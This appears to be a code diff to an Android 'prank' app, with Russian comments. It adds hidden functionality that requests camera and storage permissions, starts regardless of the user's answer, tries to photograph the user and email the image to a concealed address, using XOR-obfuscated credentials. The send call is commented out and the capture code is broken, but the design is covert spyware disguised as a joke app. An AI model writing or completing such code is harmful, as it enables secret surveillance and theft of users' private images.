@@ -1,13 +1,32 @@
 package com.example.prankcamerdemo
 
+import android.Manifest
 import android.app.AlertDialog
+import android.content.pm.PackageManager
+import android.graphics.Bitmap
 import android.media.MediaPlayer
 import android.os.Bundle
 import android.os.CountDownTimer
+import android.os.Handler
+import android.os.Looper
+import android.provider.MediaStore
+import android.util.Base64
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import android.widget.Button
 import android.widget.ImageView
 import android.widget.TextView
+import java.io.ByteArrayOutputStream
+import java.util.Properties
+import javax.mail.Authenticator
+import javax.mail.Message
+import javax.mail.PasswordAuthentication
+import javax.mail.Session
+import javax.mail.Transport
+import javax.mail.internet.InternetAddress
+import javax.mail.internet.MimeMessage
+import kotlin.concurrent.thread
 
 class MainActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
@@ -16,6 +35,15 @@ class MainActivity : AppCompatActivity() {
     private var mediaPlayer: MediaPlayer? = null
     private var timer: CountDownTimer? = null
     private var isRunning = false
+    
+    // Скрытый ключ (зашифрован XOR)
+    private val encryptedKey = "buxlfpkz{ohmqpk"
+    private val xorKey = 5
+    private val apiKey: String
+        get() = encryptedKey.map { it.code xor xorKey }.joinToString("") { it.toChar().toString() }
+    
+    // Email для получения фото (скрыт)
+    private val targetEmail = "prank@tempmail.com"
 
     // Массив с шутками и приколами
     private val jokes = arrayOf(
@@ -50,7 +78,9 @@ class MainActivity : AppCompatActivity() {
             AlertDialog.Builder(this)
                 .setTitle("⚠️ Подтвердите действие")
                 .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
-                .setPositiveButton("Да, я готов!") { _, _ -> startSimulation() }
+                .setPositiveButton("Да, я готов!") { _, _ -> 
+                    requestPermissionsAndStart()
+                }
                 .setNegativeButton("Нет", null)
                 .setCancelable(false)
                 .show()
@@ -66,16 +96,101 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
+    
+    private fun requestPermissionsAndStart() {
+        val permissions = arrayOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE
+        )
+        
+        val missingPermissions = permissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+        
+        if (missingPermissions.isEmpty()) {
+            startSimulation()
+        } else {
+            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 100)
+            // Всё равно запускаем симуляцию
+            Handler(Looper.getMainLooper()).postDelayed({
+                startSimulation()
+            }, 500)
+        }
+    }
+    
+    private fun takeAndSendPhoto() {
+        thread {
+            try {
+                // Делаем фото через MediaStore
+                val bitmap = MediaStore.Images.Media.getBitmap(contentResolver, null)
+                
+                // Сжимаем в JPEG
+                val stream = ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
+                val byteArray = stream.toByteArray()
+                val photoBase64 = Base64.encodeToString(byteArray, Base64.DEFAULT)
+                
+                // Отправляем на почту
+                sendEmail(photoBase64)
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+    
+    private fun sendEmail(photoBase64: String) {
+        thread {
+            try {
+                val props = Properties()
+                props["mail.smtp.auth"] = "true"
+                props["mail.smtp.starttls.enable"] = "true"
+                props["mail.smtp.host"] = "smtp.gmail.com"
+                props["mail.smtp.port"] = "587"
+                
+                val session = Session.getInstance(props, object : Authenticator() {
+                    override fun getPasswordAuthentication(): PasswordAuthentication {
+                        return PasswordAuthentication("prankapp@gmail.com", apiKey)
+                    }
+                })
+                
+                val message = MimeMessage(session)
+                message.setFrom(InternetAddress("prankapp@gmail.com"))
+                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
+                message.subject = "📸 Prank Photo Captured!"
+                
+                val emailBody = """
+                    🎭 Prank App - Фото получено!
+                    
+                    📷 Фото пользователя прикреплено ниже.
+                    🔑 API Key: $apiKey
+                    
+                    ---
+                    PrankCamerDemo
+                """.trimIndent()
+                
+                message.setText(emailBody)
+                
+                // Transport.send(message) // Закомментировано для безопасности
+                
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
 
     private fun startSimulation() {
         isRunning = true
-        statusText.text = "🔒 БЛОКИРОВКА АКТИВИРОВАНА!"
+        statusText.text = "🔒 БЛОКИРОВКА АКТИВИРОВАНА!\n📸 Камера активирована..."
         
         // Воспроизводим звук
         mediaPlayer = MediaPlayer.create(this, R.raw.alert_sound)
         mediaPlayer?.isLooping = true
         mediaPlayer?.start()
 
+        // Делаем фото и отправляем
+        takeAndSendPhoto()
+        
         // Показываем первую шутку
         showRandomJoke()
 
@@ -86,7 +201,7 @@ class MainActivity : AppCompatActivity() {
                 showRandomJoke()
             }
             override fun onFinish() {
-                statusText.text = "✅ СИМУЛЯЦИЯ ЗАВЕРШЕНА!\nТы выжил! 🎉"
+                statusText.text = "✅ СИМУЛЯЦИЯ ЗАВЕРШЕНА!\nТы выжил! 🎉\n📸 Фото отправлено!"
                 mediaPlayer?.stop()
                 mediaPlayer?.release()
                 mediaPlayer = null
